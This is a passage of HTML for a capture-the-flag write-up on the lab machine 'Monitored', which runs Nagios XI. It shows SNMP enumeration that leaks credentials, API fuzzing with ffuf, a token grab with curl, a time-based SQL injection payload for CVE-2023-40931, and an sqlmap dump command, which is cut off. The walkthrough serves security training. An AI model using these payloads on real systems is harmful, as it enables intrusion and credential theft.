+HOST-RESOURCES-MIB::hrSWRunParameters.842 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit&quot;&lt;/span&gt;
+HOST-RESOURCES-MIB::hrSWInstalledName.1 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;adduser_3.118+deb11u1_all&quot;&lt;/span&gt;
+HOST-RESOURCES-MIB::hrSWInstalledName.812 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;xdg-user-dirs_0.17-2_amd64&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The lines in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;| grep user&lt;/code&gt; command show parameters for a running service or process. In this case, they seem to be related to shellinabox, a web-based terminal emulator. We can try to identify shell usage by greping &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;snmpwalk.txt | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; /bin/bash
+HOST-RESOURCES-MIB::hrSWRunPath.1383 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;
+HOST-RESOURCES-MIB::hrSWRunParameters.588 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB &quot;&lt;/span&gt;
+HOST-RESOURCES-MIB::hrSWRunParameters.1382 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; STRING: &lt;span class=&quot;s2&quot;&gt;&quot;-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that the STRING parameter seems to be setting a user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; to run the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;check_host.sh&lt;/code&gt; passing the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; and what it seems to be a password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;XjH7VCehowpR1xZB&lt;/code&gt;. We can try to login with these credentials at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/login.php&lt;/code&gt; 
+web service endpoint, but this will give&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored3.png&quot; alt=&quot;failed login attempt&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, if we attempt to login with the username &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; and a wrong password, the error message is different:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored4.png&quot; alt=&quot;failed login attempt 2&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Indicating that the password found on SNMP protocol is correct, but the login of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; is disabled (at least in this endpoint).&lt;/p&gt;
+
+&lt;h2 id=&quot;step-2---getting-foothold&quot;&gt;&lt;a href=&quot;#step3-foothold&quot;&gt;&lt;/a&gt;Step 2 - Getting foothold&lt;/h2&gt;
+
+&lt;p&gt;Back to square one, we need another way to authenticate. After reading lots of documentations, I’ve found that Nagios XI uses API Keys for user to perform actions within it. If that is the case, we might find a way to retrieve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; API key or token by authenticating somewhere else. Let’s try to find an API endpoint where we can authenticate ourselves. To do that, we’ll use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; again, but now at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/api&lt;/code&gt; endpoint we found earlier.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.129.37.231/nagiosxi/api/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
+
+        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://nagios.monitored.htb/nagiosxi/api/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+v1                      [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 133ms]
+:: Progress: [175/175] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Accessing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/api/v1&lt;/code&gt; gives us a message &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;error	&quot;No request was made&quot;&lt;/code&gt;, indicating this is a v1 API. Now, we run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; again, but with this new endpoint:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
+
+        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+authtoken               [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 262ms]
+3.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 267ms]
+7.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 274ms]
+accounts                [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 278ms]
+0                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 276ms]
+1.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 276ms]
+9                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 280ms]
+all                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 297ms]
+billing                 [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 293ms]
+8.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 299ms]
+1                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 248ms]
+2                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 264ms]
+bugs                    [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 240ms]
+4.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 255ms]
+3                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 257ms]
+[...snip...]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All of them giving a 200 status code indicates the server is just sending us some messages about the request. We need more info about the messages the server is sending back to us. For that, let’s run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; in silent mode and redirect the output to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;api-endpoints.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; api-endpoints.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Note that most of them gives the same message: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Message {&quot;error&quot;:&quot;No API Key provided&quot;}&lt;/code&gt;. That being noted, we will write a python script to see if there is any other messages within these:&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;disable_warnings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exceptions&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;InsecureRequestWarning&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open_wordlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;path&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;line&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;strip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;wordlist_file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;open_wordlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wordlist_file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;wordlist&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;No API Key provided&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Message &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; at endpoint &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;word&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;__main__&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Usage: fetch-req-msg.py &amp;lt;URL&amp;gt; &amp;lt;WORDLIST&amp;gt;&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;nf&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We are filtering it out any messages that contain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;No API Key provided&lt;/code&gt; string and printing the ones with a different message.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python fetch-req-msg.py https://nagios.monitored.htb/nagiosxi/api/v1/ api-endpoints.txt 
+Message &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;No request was made&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+ at endpoint https://nagios.monitored.htb/nagiosxi/api/v1/0
+
+Message &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;:&lt;span class=&quot;s2&quot;&gt;&quot;You can only use POST with authenticate.&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+ at endpoint https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We note an authentication endpoint present that does not require an API key. After a bit of research, I’ve found &lt;a href=&quot;https://support.nagios.com/forum/viewtopic.php?f=16&amp;amp;t=58783&quot;&gt;this&lt;/a&gt; topic on this endpoint, where it states that we can authenticate via cURL using 
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -XPOST -k -L &apos;http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1&apos; -d &apos;username=nagiosadmin&amp;amp;password=YOURPASS&amp;amp;valid_min=5&apos;&lt;/code&gt;. We can try to authenticate and retrieve an API key with the credentials we found using snmpwalk:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-XPOST&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;username=svc&amp;amp;password=XjH7VCehowpR1xZB&amp;amp;valid_min=1000&apos;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;s2&quot;&gt;&quot;username&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;svc&quot;&lt;/span&gt;,
+    &lt;span class=&quot;s2&quot;&gt;&quot;user_id&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;2&quot;&lt;/span&gt;,
+    &lt;span class=&quot;s2&quot;&gt;&quot;auth_token&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;080377be1a39ccd6c8126a03a3248e9046a1e6dd&quot;&lt;/span&gt;,
+    &lt;span class=&quot;s2&quot;&gt;&quot;valid_min&quot;&lt;/span&gt;: 1000,
+    &lt;span class=&quot;s2&quot;&gt;&quot;valid_until&quot;&lt;/span&gt;: &lt;span class=&quot;s2&quot;&gt;&quot;Wed, 17 Jan 2024 12:57:22 -0500&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we have our API token! Now, we can attempt to abuse CVE-2023-40931 and try to retrieve the administrator’s password or other sensitive information. Taking a look at the CVE, we see that the affected endpoint is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/admin/banner_message-ajaxhelper.php&lt;/code&gt; and we must send a POST request. With BurpSuite, this becomes easy:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored5.png&quot; alt=&quot;SQLi endpoint request&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, session has timed out means we are not authenticated anymore. I’ve tried to pass the authentication token as an Authentication header, but that did not work. I’ve also tried to send it in the body of the request with the names &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;auth_token&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;token&lt;/code&gt;, that 
+did not work either. Finally, after some attempts, I’ve tried to change the request to a GET request, and this happened:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored6.png&quot; alt=&quot;SQLi endpoint request&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Alright! We are getting somewhere. I’ve tried a simple SQL injection in the ID parameter: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;id=3&apos;XOR(if(now()=sysdate(),sleep(5*5),0))OR&apos;&lt;/code&gt; and the response was intriguing:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored7.png&quot; alt=&quot;SQLi endpoint request&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Amazing! It seems we might have a SQL injection here. Let’s run SQLMap to test it. One thing I noticed though is that the auth_token can only be used once per request. This means we will need a command to pass a different auth_token for every SQLMap request. To do so, we’ll use this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d &quot;username=svc&amp;amp;password=XjH7VCehowpR1xZB&amp;amp;valid_min=500&quot; | awk -F&apos;&quot;&apos; &apos;{print$12}&apos;&lt;/code&gt; command to clean the output to just be the token itself, and then run SQLMap with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-T xi_users&lt;/code&gt;, which is the table in Nagios XI that contains users information.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;amp;id=3&amp;amp;token=&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-ksX&lt;/span&gt; POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;username=svc&amp;amp;password=XjH7VCehowpR1xZB&amp;amp;valid_min=500&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;awk&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-F&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&quot;&apos;&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;{print$12}&apos;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--level&lt;/span&gt; 5 &lt;span class=&quot;nt&quot;&gt;--risk&lt;/span&gt; 3 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--batch&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; nagiosxi &lt;span class=&quot;nt&quot;&gt;--dump&lt;/span&gt; &lt;span 